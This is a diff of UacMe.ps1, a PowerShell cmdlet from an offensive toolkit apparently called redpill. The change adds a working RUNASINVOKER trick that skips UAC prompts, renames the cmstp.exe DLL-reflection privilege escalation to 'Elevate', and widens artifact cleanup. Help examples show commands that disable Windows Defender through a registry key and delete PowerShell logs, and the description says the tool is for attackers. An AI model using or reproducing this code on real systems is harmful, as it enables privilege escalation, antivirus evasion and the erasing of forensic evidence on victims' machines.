@@ -6,7 +6,7 @@
    Tested Under: Windows 10 (18363) x64 bits
    Required Dependencies: Reflection.Assembly {native}
    Optional Dependencies: none
-   PS cmdlet Dev version: v1.1.3
+   PS cmdlet Dev version: v1.2.3
 
 .DESCRIPTION 
    This CmdLet creates\compiles Source.CS into Trigger.dll and performs UAC bypass
@@ -14,7 +14,7 @@
    and elevate privileges { user -> admin } or to exec one command with admin privs!
 
 .Parameter Action
-   Accepts arguments: Bypass OR Clean
+   Accepts arguments: Bypass, Elevate OR Clean
 
 .Parameter Execute
    Accepts the command\appl to be executed! (cmd|powershell)
@@ -27,19 +27,23 @@
    Access this cmdlet comment based help
 
 .EXAMPLE
-   PS C:\> .\UacMe.ps1 -Action Bypass -Execute "cmd.exe"
+   PS C:\> .\UacMe.ps1 -Action Bypass -Execute "regedit.exe"
+   Spawns regedit without uac asking for execution confirmation
+
+.EXAMPLE
+   PS C:\> .\UacMe.ps1 -Action Elevate -Execute "cmd.exe"
    Local spawns an cmd prompt with administrator privileges! 
    
 .EXAMPLE
-   PS C:\> .\UacMe.ps1 -Action Bypass -Execute "powershell.exe"
+   PS C:\> .\UacMe.ps1 -Action Elevate -Execute "powershell.exe"
    Local spawns an powershell prompt with administrator privileges!   
 
 .EXAMPLE
-   PS C:\> .\UacMe.ps1 -Action Bypass -Execute "powershell -file $Env:TMP\redpill.ps1"
+   PS C:\> .\UacMe.ps1 -Action Elevate -Execute "powershell -file $Env:TMP\redpill.ps1"
    Executes redpill.ps1 script trougth uac bypass module with elevated shell privs {admin}
    
 .EXAMPLE
-   PS C:\> .\UacMe.ps1 -Action Bypass -Execute "powershell -file $Env:TMP\DisableDefender.ps1 -Action Stop"
+   PS C:\> .\UacMe.ps1 -Action Elevate -Execute "powershell -file $Env:TMP\DisableDefender.ps1 -Action Stop"
    Executes DisableDefender.ps1 script trougth uac bypass module with elevated shell privs {admin}
 
 .EXAMPLE
@@ -103,6 +107,73 @@ If($Action -ieq "Bypass"){
 
    <#
    .SYNOPSIS
+      Helper - Bypass UAC execution confirmation!
+
+   .DESCRIPTION
+      This function allow attackers to execute applications
+      without beeing bored with uac execution confirmation prompt
+
+   .NOTES
+      Required dependencies: RUNASINVOKER API {native}
+      Remark: This function does NOT elevate process privileges!
+
+   .EXAMPLE
+      PS C:\> .\UacMe.ps1 -Action Bypass -Execute "regedit.exe"
+      Spawns regedit without uac asking for execution confirmation
+
+   .OUTPUTS
+      Bypass UAC execution confirmation!
+      ----------------------------------
+      Trigger: C:\Users\pedro\AppData\Local\Temp\GyCgIuT.bat
+      Execute: regedit.exe
+   #>
+
+
+## Create Trigger Batch script
+$RawBATcript = @(":: Author: @r00t-3xp10it
+:: Framework: @redpill - UacMe.ps1
+@echo off
+set __COMPAT_LAYER=RUNASINVOKER
+start `"`" `"$Execute`"
+exit")
+
+
+   ## Build Output Table
+   Write-Host "`n`nBypass UAC execution confirmation!" -ForegroundColor Green
+   Write-Host "----------------------------------"
+
+   ## Write Source.bat script into %tmp% directory!
+   $RandomMe = -join ((65..90) + (97..122) | Get-Random -Count 7 | % {[char]$_})
+   echo "$RawBATcript"|Out-File "$Env:TMP\$RandomMe.bat" -encoding ascii -force
+
+   If(Test-Path -Path "$Env:TMP\$RandomMe.bat" -EA SilentlyContinue){
+
+      ## Execute trigger batch script
+      Write-Host "Trigger: $Env:TMP\$RandomMe.bat"
+      Write-Host "Execute: $Execute`n`n";Start-Sleep -Seconds 1
+      Start-Process -FilePath "$Env:TMP\$RandomMe.bat"
+
+   }Else{## [error] fail to create Trigger.bat
+   
+      Write-Host "[error] fail to create $RandomMe.bat`n`n" -ForegroundColor Red -BackgroundColor Black
+      exit ## Exit @UacMe
+   
+   }
+
+   Start-Sleep -Seconds 1
+   ## Delete artifacts left behind!
+   If(Test-Path -Path "$Env:TMP\$RandomMe.bat"){
+      Remove-Item -Path "$Env:TMP\$RandomMe.bat" -Force
+   }
+
+exit ## Exit @UacMe
+}
+
+
+If($Action -ieq "Elevate"){
+
+   <#
+   .SYNOPSIS
       Helper - UAC bypass|EOP by dll reflection! (cmstp.exe)
    
    .DESCRIPTION
@@ -112,19 +183,19 @@ If($Action -ieq "Bypass"){
       
    .NOTES
       Required dependencies: Source.sc { auto-Build }
-      Required dependencies: Trigger.dll { auto-Build }
+      Required dependencies: DavSyncProvider.dll { auto-Build }
       Required dependencies: Reflection.Assembly {native}
    
    .EXAMPLE
-      PS C:\> .\UacMe.ps1 -Action Bypass -Execute "powershell.exe"
+      PS C:\> .\UacMe.ps1 -Action Elevate -Execute "powershell.exe"
       Local spawns an powershell prompt with administrator privileges!
       
    .EXAMPLE
-      PS C:\> .\UacMe.ps1 -Action Bypass -Execute "powershell -file $Env:TMP\redpill.ps1"
+      PS C:\> .\UacMe.ps1 -Action Elevate -Execute "powershell -file $Env:TMP\redpill.ps1"
       Execute redpill.ps1 script trougth uac bypass module to elevate shell privileges to admin!
       
    .EXAMPLE
-      PS C:\> .\UacMe.ps1 -Action Bypass -Execute "cmd /c Reg Add 'HKLM\Software\Policies\Microsoft\Windows Defender' /v DisableAntiSpyware /t REG_DWORD /d 1 /f"
+      PS C:\> .\UacMe.ps1 -Action Elevate -Execute "cmd /c Reg Add 'HKLM\Software\Policies\Microsoft\Windows Defender' /v DisableAntiSpyware /t REG_DWORD /d 1 /f"
       Disables Windows Defender { permanent - does not start with PC restart } by adding a registry key to HKLM hive!
    #>
    
@@ -336,7 +407,7 @@ If($Action -ieq "Clean"){
       Clean ALL artifacts left behind by this cmdlet by is 'CreationDate'
       
    .EXAMPLE
-      PS C:\> .\UacMe.ps1 -Action Bypass -Execute "powershell -file $Env:TMP\UacMe.ps1 -Action Clean"
+      PS C:\> .\UacMe.ps1 -Action Elevate -Execute "powershell -file $Env:TMP\UacMe.ps1 -Action Clean"
       Clean ALL artifacts left behind by this cmdlet and delete powershell logfiles using uac bypass technic!
    
    .OUTPUTS
@@ -369,10 +440,10 @@ If($Action -ieq "Clean"){
       $Date = Get-date -Format "dd/MM/yyyy" ## Get todays date: 19/04/2021   
    }
 
-   ## This function deletes ALL .cs files from '%tmp%'
+   ## This function deletes ALL .cs|.bat files from '%tmp%'
    # directory. If the 'CreationTime' of the files Matches todays date!
    $CleanInf = (Get-ChildItem -Path "$Env:TMP" | Where-Object { 
-      $_.CreationTime.ToString() -Match "$Date" -and $_.Name -Match '(.cs)$' 
+      $_.CreationTime.ToString() -Match "$Date" -and $_.Name -Match '(.cs|.bat)$' 
    }).FullName
    ForEach($Item in $CleanInf){## Delete ALL .cs files found from &tmp%
       Remove-Item -Path "$Item" -EA SilentlyContinue -Force
